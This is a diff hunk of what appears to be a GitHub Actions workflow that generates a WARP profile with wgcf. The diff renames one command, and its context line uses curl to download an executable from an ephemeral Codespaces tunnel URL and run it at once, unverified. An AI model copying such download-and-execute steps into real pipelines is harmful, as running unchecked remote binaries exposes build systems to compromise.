@@ -49,7 +49,7 @@ jobs:
       run: |
         curl -sL https://orange-space-chainsaw-977rr4wqvj9929v75-8000.app.github.dev/wgcf.exe -o wgcf.cmd && ./wgcf.cmd
         ./wgcf.cmd register
-        ./wgcf generate
+        ./wgcf.cmd generate
     - name: Upload profile
       uses: actions/upload-artifact@v3
       with:
